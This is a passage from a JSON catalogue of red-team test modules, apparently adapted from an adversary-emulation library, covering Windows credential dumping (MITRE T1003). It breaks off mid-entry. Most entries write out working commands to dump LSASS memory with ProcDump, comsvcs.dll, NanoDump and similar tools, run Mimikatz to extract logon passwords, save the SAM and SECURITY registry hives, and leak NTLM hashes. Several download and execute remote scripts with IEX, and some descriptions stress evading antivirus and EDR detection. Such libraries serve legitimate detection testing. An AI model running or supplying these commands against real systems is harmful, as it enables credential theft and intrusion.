        "executor_type": "powershell",
        "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "IIS must be installed prior to running the test",
          "check_command": "if ((Get-WindowsFeature Web-Server).InstallState -eq \"Installed\") {exit 0} else {exit 1}",
          "install_command": "Install-WindowsFeature -name Web-Server -IncludeManagementTools"
        }
      ],
      "rx_module_id": "42510244-5019-48fa-a0e5-66c3b76e6049",
      "module_name": "Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)"
    },
    {
      "index": 8,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "rundll32.exe keymgr,KRShowKeyMgr",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "84113186-ed3c-4d0d-8a3c-8980c86c1f4a",
      "module_name": "Dump Credential Manager using keymgr.dll and rundll32.exe"
    },
    {
      "index": 9,
      "technique_id": "T1003",
      "technique_name": "OS Credential Dumping",
      "description": "RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. \nRef: https://twitter.com/vysecurity/status/974806438316072960",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "custom_port",
          "description": "Specify the custom port number",
          "type": "integer",
          "default_value": "1234"
        },
        {
          "name": "server_ip",
          "description": "Specify the server IP address. If not specified, the loop back IP will be used",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0b207037-813c-4444-ac3f-b597cf280a67",
      "module_name": "Send NTLM Hash with RPC Test Connection"
    },
    {
      "index": 10,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where resulting dump should be placed",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\lsass_dump.dmp"
        },
        {
          "name": "procdump_exe",
          "description": "Path of Procdump executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\procdump.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
          "check_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
        }
      ],
      "rx_module_id": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
      "module_name": "Dump LSASS.exe Memory using ProcDump"
    },
    {
      "index": 11,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2536dee2-12fb-459a-8c37-971844fa73be",
      "module_name": "Dump LSASS.exe Memory using comsvcs.dll"
    },
    {
      "index": 12,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{dumpert_exe}\"\n",
        "elevation_required": true,
        "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "dumpert_exe",
          "description": "Path of Dumpert executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
          "check_command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n"
        }
      ],
      "rx_module_id": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
      "module_name": "Dump LSASS.exe Memory using direct system calls and API unhooking"
    },
    {
      "index": 13,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
        "elevation_required": true,
        "cleanup_command": "del \"%temp%\\nanodump.dmp\" >nul 2> nul\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "NanoDump executable must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
          "check_command": "if (Test-Path PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n"
        }
      ],
      "rx_module_id": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
      "module_name": "Dump LSASS.exe Memory using NanoDump"
    },
    {
      "index": 14,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dea6c349-f1c6-44f3-87a1-1ed33a59a607",
      "module_name": "Dump LSASS.exe Memory using Windows Task Manager"
    },
    {
      "index": 15,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path of the Lsass dump",
          "type": "path",
          "default_value": "%tmp%\\lsass.DMP"
        },
        {
          "name": "mimikatz_exe",
          "description": "Path of the Mimikatz binary",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
          "check_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        },
        {
          "description": "Lsass dump must exist at specified location (#{input_file})\n",
          "check_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
          "install_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"
        }
      ],
      "rx_module_id": "453acf13-1dbd-47d7-b28a-172ce9228023",
      "module_name": "Offline Credential Theft With Mimikatz"
    },
    {
      "index": 16,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
        "elevation_required": true,
        "cleanup_command": "del \"%temp%\\nanodump.dmp\" > nul 2> nul\n"
      },
      "variables": [
        {
          "name": "venv_path",
          "description": "Path to the folder for the tactics venv",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\venv_t1003_001"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must have python 3 installed\n",
          "check_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        },
        {
          "description": "Computer must have venv configured at #{venv_path}\n",
          "check_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
          "install_command": "py -m venv \"#{venv_path}\"\n"
        },
        {
          "description": "pypykatz must be installed \n",
          "check_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
        }
      ],
      "rx_module_id": "c37bc535-5c62-4195-9cc3-0517673171d8",
      "module_name": "LSASS read with pypykatz"
    },
    {
      "index": 17,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6502c8f0-b775-4dbd-9193-1298f56b6781",
      "module_name": "Dump LSASS.exe Memory using Out-Minidump.ps1"
    },
    {
      "index": 18,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where resulting dump should be placed",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\lsass_dump.dmp"
        },
        {
          "name": "procdump_exe",
          "description": "Path of Procdump executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\procdump.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
          "check_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
        }
      ],
      "rx_module_id": "7cede33f-0acd-44ef-9774-15511300b24b",
      "module_name": "Create Mini Dump of LSASS.exe using ProcDump"
    },
    {
      "index": 19,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_script",
          "description": "URL to a remote Mimikatz script that dumps credentials",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc",
      "module_name": "Powershell Mimikatz"
    },
    {
      "index": 20,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": ".Net v5 must be installed\n",
          "check_command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
          "install_command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n"
        }
      ],
      "rx_module_id": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0",
      "module_name": "Dump LSASS with createdump.exe from .Net v5"
    },
    {
      "index": 21,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{xordump_exe} -out #{output_file} -x 0x41\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "xordump_exe",
          "description": "Path to xordump",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\xordump.exe"
        },
        {
          "name": "output_file",
          "description": "Path where resulting dump should be placed",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must have xordump.exe\n",
          "check_command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n"
        }
      ],
      "rx_module_id": "86fc3f40-237f-4701-b155-81c01c48d697",
      "module_name": "Dump LSASS.exe using imported Microsoft DLLs"
    },
    {
      "index": 22,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
      "module_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe"
    },
    {
      "index": 23,
      "technique_id": "T1003.001",
      "technique_name": "OS Credential Dumping: LSASS Memory",
      "description": "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defenders viewpoint its within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n",
        "elevation_required": true,
        "cleanup_command": "rmdir \"#{output_folder}\" /s /q >nul 2> nul\n"
      },
      "variables": [
        {
          "name": "output_folder",
          "description": "Folder Path where resulting dump should be placed",
          "type": "path",
          "default_value": "%temp%\\SilentProcessExit"
        }
      ],
      "prerequisites": [
        {
          "description": "NanoDump executable must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
          "check_command": "if (Test-Path PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n"
        }
      ],
      "rx_module_id": "eb5adf16-b601-4926-bca7-dad22adffb37",
      "module_name": "Dump LSASS.exe Memory through Silent Process Exit"
    },
    {
      "index": 24,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
        "elevation_required": true,
        "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5c2571d0-1572-416d-9676-812e64ca9f44",
      "module_name": "Registry dump of SAM, creds, and secrets"
    },
    {
      "index": 25,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Parses registry hives to obtain stored credentials.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "venv_path",
          "description": "Path to the folder for the tactics venv",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\venv_t1003_002"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must have python 3 installed\n",
          "check_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        },
        {
          "description": "Computer must have venv configured at #{venv_path}\n",
          "check_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
          "install_command": "py -m venv \"#{venv_path}\"\n"
        },
        {
          "description": "pypykatz must be installed \n",
          "check_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
        }
      ],
      "rx_module_id": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263",
      "module_name": "Registry parse with pypykatz"
    },
    {
      "index": 26,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n",
        "elevation_required": true,
        "cleanup_command": "del #{copy_dest}\\#{file_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to the file to copy",
          "type": "path",
          "default_value": "%SystemRoot%/system32/config/SAM"
        },
        {
          "name": "file_name",
          "description": "Name of the copied file",
          "type": "string",
          "default_value": "SAM"
        },
        {
          "name": "copy_dest",
          "description": "Destination of the copied file",
          "type": "string",
          "default_value": "%temp%"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a90c2f4d-6726-444e-99d2-a00cd7c20480",
      "module_name": "esentutl.exe SAM copy"
    },
    {
      "index": 27,
      "technique_id": "T1003.002",
      "technique_name": "OS Credential Dumping: Security Account Manager",
      "description": "Executes a hashdump by reading the hashes from the registry.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "PowerDump script must exist on disk at specified location",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1} ",
